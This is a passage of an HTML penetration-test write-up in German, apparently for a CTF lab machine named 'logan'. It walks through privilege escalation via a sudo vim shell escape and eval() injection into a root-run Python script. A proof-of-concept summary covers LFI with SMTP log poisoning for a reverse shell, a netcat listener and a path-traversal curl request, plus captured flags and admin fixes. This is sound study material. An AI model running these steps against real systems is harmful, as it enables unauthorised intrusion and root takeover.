+                     <div class="prompt">www-data@logan:/home/logan$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">User: ilovelogs</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Home-Verzeichnis von `logan` ist unsicher konfiguriert (weltbeschreibbar: `drwxr-xrwx`). `www-data` kann die User-Flag lesen: `<span class="password">User: ilovelogs</span>`. Die Datei `to-do` gehört einem anderen Benutzer (UID 1002, GID 1003).</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Rechte für `www-data` werden überprüft.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@logan:/home/logan$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for www-data on logan:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on logan:
+    <span class="command">(logan) NPASSWD: /usr/bin/vim</span>
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! `www-data` darf `/usr/bin/vim` als Benutzer `logan` ohne Passwort ausführen. Da `vim` das Ausführen von Shell-Befehlen erlaubt (z.B. mit `:!/bin/sh`), kann dies zur Eskalation von `www-data` zu `logan` genutzt werden.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die `sudo vim`-Berechtigung wird ausgenutzt, um eine Shell als `logan` zu erhalten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@logan:/var/www/admin$ <span class="command">sudo -u logan /usr/bin/vim -c ':!/bin/sh'</span></div>
+                     <pre>[Vim öffnet sich und führt sofort den Shell-Befehl aus]</pre>
+                     <div class="prompt">$ <span class="command">id</span></div> <!-- Prompt der neuen Shell als logan -->
+                     <pre><span class="password">uid=1000(logan) gid=1000(logan) groups=1000(logan),27(sudo),1002(administration)</span></pre>
+                     <div class="prompt">$</div>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Exploit ist erfolgreich. Der Angreifer hat nun eine Shell als Benutzer `logan`.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die Datei `to-do` im Home-Verzeichnis von `logan` wird untersucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">logan@logan:~$ <span class="command">cat to-do</span></div>
+                     <pre>- Go outside
+- Try the new script that gave me root to learn python</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Notiz erwähnt ein Skript, das Root-Rechte erlangt hat ("script that gave me root"). Dies ist ein wichtiger Hinweis für die weitere Eskalation.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die SUID-Dateien werden erneut überprüft (diesmal als `logan`).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">logan@logan:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div> <!-- Maskierung -->
+                     <pre>... (Standard SUID-Dateien) ...</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Keine ungewöhnlichen SUID-Dateien werden gefunden.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die `sudo`-Rechte für `logan` werden überprüft.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">logan@logan:~$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for logan on logan:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User logan may run the following commands on logan:
+    <span class="command">(root) NPASSWD: /usr/bin/python3 /opt/learn_some_python.py</span>
+</pre>
+                  </div>
+              </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! `logan` darf `/usr/bin/python3 /opt/learn_some_python.py` als `root` ohne Passwort ausführen. Dies ist der wahrscheinlichste Vektor zur Root-Eskalation, insbesondere im Zusammenhang mit der Notiz "script that gave me root".</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Das Python-Skript `/opt/learn_some_python.py` wird über `sudo` ausgeführt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">logan@logan:~$ <span class="command">sudo -u root /usr/bin/python3 /opt/learn_some_python.py</span></div>
+                     <pre>
+Welcome!!!
+
+ The first you need to now is how to use print, please type print('hello')
+</pre>
+                     <div class="prompt">[Eingabeaufforderung des Skripts] ></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Das Skript scheint eine interaktive Python-Lernumgebung zu sein. Es wird versucht, Code über `eval()` zu injizieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Eingabeaufforderung des Skripts] > <span class="command">eval('__import__("os").system("id")')</span></div>
+                     <pre><span class="password">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das Skript führt die Eingabe unsicher aus (wahrscheinlich mit `eval()` oder einer ähnlichen Funktion), was die Ausführung von beliebigem Python-Code als Root ermöglicht. Die RCE wurde bestätigt.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die Schwachstelle wird genutzt, um eine Root-Bash-Shell zu starten.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">[Eingabeaufforderung des Skripts] > <span class="command">eval('__import__("os").system("/bin/bash -p")')</span></div>
+                     <div class="prompt">root@logan:/home/logan#</div> <!-- Root-Shell! -->
+                  </div>
+              </div>
+               <p class="analysis"><strong>Analyse Fortsetzung:** Die Flags werden gelesen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">root@logan:/home/logan# <span class="command">cd ~</span></div>
+                     <div class="prompt">root@logan:~# <span class="command">ls</span></div>
+                     <pre>root.txt  snap</pre>
+                     <div class="prompt">root@logan:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">Root: siuuuuuuuu</span></pre>
+                     <div class="prompt">root@logan:~# <span class="command">cat /home/logan/user.txt</span></div>
+                     <pre><span class="password">User: ilovelogs</span></pre>
+                  </div>
+              </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Privilegieneskalation zu Root war durch Ausnutzung der unsicheren `sudo`-Regel für das Python-Skript erfolgreich. Beide Flags wurden gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Dokumentieren Sie die Eskalationspfade: LFI -> RCE (www-data), sudo vim (www-data zu logan), sudo python (logan zu root).
+<br><strong>Empfehlung (Admin):** Entfernen Sie die unsicheren `sudo`-Regeln für `vim` und das Python-Skript. Überprüfen Sie den Code von `/opt/learn_some_python.py` und beheben Sie die unsichere Eingabeverarbeitung (`eval`). Korrigieren Sie die Berechtigungen für `/home/logan`. Beheben Sie die LFI in `payments.php`.</p>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC beschreibt die Eskalationskette: Ausnutzung einer LFI in `payments.php` durch Log Poisoning via SMTP für Initial Access als `www-data`. Eskalation zu `logan` durch Missbrauch einer `sudo vim`-Regel. Schließlich Eskalation zu `root` durch Ausnutzung einer unsicheren `sudo`-Regel für ein Python-Skript, das `eval()` verwendet.</p>
+
+            <h3>POC Schritt 1: Initial Access (www-data via LFI/Log Poisoning)</h3>
+            <p class="analysis"><strong>Schwachstellen:</strong> LFI in `payments.php`, SMTP VRFY erlaubt User Enumeration, Mailbox über LFI lesbar/includierbar.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Finde LFI in `payments.php` (`file=` Parameter).</li>
+                <li>Identifiziere `www-data` als gültigen Mail-Benutzer (via `VRFY www-data`).</li>
+                <li>Sende E-Mail mit PHP-Reverse-Shell-Payload an `www-data@logan.hmv` via SMTP (Port 25).</li>
+                <li>Starte Netcat-Listener (`nc -lvnp 443`).</li>
+                <li>Löse LFI auf `/var/mail/www-data` aus: `curl http://admin.logan.hmv/payments.php -d 'file=....//....//....//....//....//....//var/mail/www-data'`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Reverse Shell als `www-data`.</p>
+
+            <h3>POC Schritt 2: Privilege Escalation (www-data zu logan via sudo vim)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> Unsichere `sudo`-Regel: `(logan) NPASSWD: /usr/bin/vim`.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `www-data`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Führe `sudo -l` aus, um die Regel zu finden.</li>
+                <li>Führe Vim als `logan` aus und starte eine Shell: `sudo -u logan /usr/bin/vim -c ':!/bin/sh'`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Shell als Benutzer `logan`.</p>
+
+            <h3>POC Schritt 3: Privilege Escalation (logan zu root via sudo python eval)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> Unsichere `sudo`-Regel: `(root) NPASSWD: /usr/bin/python3 /opt/learn_some_python.py`, unsichere `eval()`-Nutzung im Skript.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `logan`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Führe `sudo -l` aus, um die Regel zu finden.</li>
+                <li>Starte das Python-Skript mit `sudo`: `sudo -u root /usr/bin/python3 /opt/learn_some_python.py`.</li>
+                <li>An der Eingabeaufforderung des Skripts Code injizieren: `eval('__import__("os").system("/bin/bash -p")')`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Root-Shell.</p>
+            <p class="analysis"><strong>Beweismittel:</strong> Ausführung von `id` zeigt `uid=0(root)`. Lesen von `/root/root.txt` ist möglich.</p>
+
+            <p class="evaluation"><strong>Risikobewertung:</strong> Sehr hoch. Die Kombination aus LFI, Log Poisoning und mehreren unsicheren `sudo`-Regeln (insbesondere für Editoren und Skripte mit `eval`) ermöglicht einem Angreifer mit Netzwerkzugriff die vollständige Übernahme des Systems.</p>
+            <p class="recommendation"><strong>Empfehlungen:**
+*   **Admin:** LFI beheben (Eingabevalidierung, `open_basedir`). `sudo`-Regeln drastisch einschränken (kein `vim`, kein Skript mit `eval`, `NOPASSWD` vermeiden). Postfix härten (VRFY deaktivieren). Berechtigungen von Home-Verzeichnissen korrigieren. Code von `/opt/learn_some_python.py` sicher gestalten.
+*   **Pentester:** Die Eskalationspfade und insbesondere die gefährlichen `sudo`-Konfigurationen hervorheben.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/logan/user.txt</div>
+                     <div class="flag-value"><span class="password">User: ilovelogs</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">Root: siuuuuuuuu</span></div>
+                 </div>
+             </div>
+        </section>
+  
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 19. Juli 2023</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
